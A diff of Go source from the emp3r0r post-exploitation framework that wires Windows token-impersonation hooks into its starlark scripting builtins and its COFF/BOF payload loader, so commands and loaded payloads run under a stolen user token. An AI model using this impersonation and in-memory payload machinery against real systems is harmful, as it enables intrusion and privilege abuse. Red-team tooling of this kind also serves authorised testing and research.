@@ -5,27 +5,48 @@ package modules
 import (
 	"fmt"
 
+	"github.com/jm33-m0/emp3r0r/core/lib/coffloader"
 	"github.com/jm33-m0/emp3r0r/core/lib/priv"
 	"github.com/jm33-m0/emp3r0r/core/lib/script"
 	"golang.org/x/sys/windows"
 )
 
 func init() {
-	// Register the Windows-specific process-creation hook so that
-	// starlark's exec_cmd automatically uses CreateProcessWithTokenW
-	// when a token is active (i.e. when ExecuteAsToken is on the stack).
+	// ---- starlark hooks ----
+	// Each starlark builtin that does I/O calls runWithToken, which uses
+	// these to LockOSThread + impersonate around the sensitive call.
+	script.ImpersonateFn = func(token uintptr) error {
+		return priv.ImpersonateThread(windows.Handle(token))
+	}
+	script.RevertFn = func() {
+		priv.RevertThread()
+	}
 	script.ExecWithToken = func(token uintptr, commandLine string) error {
 		return priv.CreateProcessWithToken(windows.Handle(token), commandLine)
 	}
+
+	// ---- coffloader hooks ----
+	// COFF/BOF payloads are executed on a dedicated goroutine inside
+	// coffloader. These hooks ensure that goroutine is impersonated before
+	// the BOF entry point (syscall.SyscallN) is called.
+	coffloader.PreExecHook = func(token uintptr) {
+		_ = priv.ImpersonateThread(windows.Handle(token))
+	}
+	coffloader.PostExecHook = func() {
+		priv.RevertThread()
+	}
 }
 
-// executeWithToken runs action under the impersonation context of the token
-// identified by sid in priv.TokenMap. If sid is empty the action is called
-// directly with token=0 (no impersonation).
+// executeWithToken looks up the token identified by sid in priv.TokenMap
+// and passes its handle (as uintptr) to action. If sid is empty, action
+// receives 0 (no impersonation).
 //
-// The token handle (as uintptr) is passed to action so that in-process
-// consumers such as starlark's exec_cmd can spawn children under the
-// impersonated identity via CreateProcessWithTokenW.
+// Unlike earlier versions this does NOT call ExecuteAsToken. Each consumer
+// is responsible for its own impersonation:
+//   - starlark builtins use runWithToken (ImpersonateThread / RevertThread)
+//     around individual syscalls.
+//   - shell/python/… child processes ignore the thread token; use
+//     CreateProcessWithTokenW when a child must run under the stolen identity.
 func executeWithToken(sid string, action func(token uintptr) error) error {
 	if sid == "" {
 		return action(0)
@@ -41,7 +62,5 @@ func executeWithToken(sid string, action func(token uintptr) error) error {
 		return fmt.Errorf("invalid token handle type for SID %q", sid)
 	}
 
-	return priv.ExecuteAsToken(hToken, func() error {
-		return action(uintptr(hToken))
-	})
+	return action(uintptr(hToken))
 }
